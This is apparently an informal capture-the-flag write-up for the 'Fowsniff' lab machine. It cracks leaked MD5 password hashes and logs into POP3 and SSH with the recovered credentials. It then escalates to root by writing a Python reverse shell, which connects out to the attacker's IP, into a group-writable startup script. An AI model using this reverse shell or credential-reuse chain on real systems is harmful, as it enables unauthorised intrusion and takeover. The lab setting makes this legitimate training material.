Fowsniff's internal system suffered a data breach that resulted in the exposure of employee usernames and passwords.

Client information was not affected.

Due to the strong possibility that employee information has been made publicly available, all employees have been instructed to change their passwords immediately.

The attackers were also able to hijack our official @fowsniffcorp Twitter account. All of our official tweets have been deleted and the attackers may release sensitive information via this medium. We are working to resolve this at soon as possible.

We will return to full capacity after a service upgrade.




@fowsniffcorp 
https://twitter.com/fowsniffcorp?lang=en
when we go to this page of twitter we do find a hashdump of passwords
https://pastebin.com/NrAqVeeX



now we will crack all the passwords using hashcat and as in the hashdump its given that the hash is md5
so let's see

we can crack them easily
now what we have to do is find one for the serina
and using hascat we do the password to be 
>>>>>>>>>>scoobydoo2


sysadmin? roflcopter
stone@fowsniff:a92b8a29ef1183192e3d35187e0cfabd



now as its given we can use this to login to the pop3 server 
use
nc <ip> 110
user seina
pass scoobydoo2
list 

and we will get the list of the emails she recived

1 1622

Dear All,

A few days ago, a malicious actor was able to gain entry to
our internal email systems. The attacker was able to exploit
incorrectly filtered escape characters within our SQL database
to access our login credentials. Both the SQL and authentication
system used legacy methods that had not been updated in some time.

We have been instructed to perform a complete internal system
overhaul. While the main systems are "in the shop," we have
moved to this isolated, temporary server that has minimal
functionality.

This server is capable of sending and receiving emails, but only
locally. That means you can only send emails to other users, not
to the world wide web. You can, however, access this system via 
the SSH protocol.

The temporary password for SSH is "S1ck3nBluff+secureshell"

You MUST change this password as soon as possible, and you will do so under my
guidance. I saw the leak the attacker posted online, and I must say that your
passwords were not very secure.

Come see me in my office at your earliest convenience and we'll set it up.

Thanks,
A.J Stone

Devin,

You should have seen the brass lay into AJ today!
We are going to be talking about this one for a looooong time hahaha.
Who knew the regional manager had been in the navy? She was swearing like a sailor!

I don't know what kind of pneumonia or something you brought back with
you from your camping trip, but I think I'm coming down with it myself.
How long have you been gone - a week?
Next time you're going to get sick and miss the managerial blowout of the century,
at least keep it to yourself!

I'm going to head home early and eat some chicken soup. 
I think I just got an email from Stone, too, but it's probably just some
"Let me explain the tone of my meeting with management" face-saving mail.
I'll read it when I get back.

Feel better,

Skyler

PS: Make sure you change your email password. 
AJ had been telling us to do that right before Captain Profanity showed up.



by using the username as
baksteen and password as S1ck3nBluff+secureshell
we are able to ssh into the server

we have to find a file which will seem peculiar
----->
find / -type f -group 100 2>>/dev/null

/opt/cube/cube.sh



now as stated we hae to make a reverse shell from this
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<IP>,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

the command after editing--------->

python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.25.132",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

now after saving this inside the cube.sh

we will relogin and we will put our nc on port 1234
nc -lvnp 1234
and we will get a shell whihc has root priv when we put the password
and now we cat the root.txt
inside the root dir


cat flag.txt
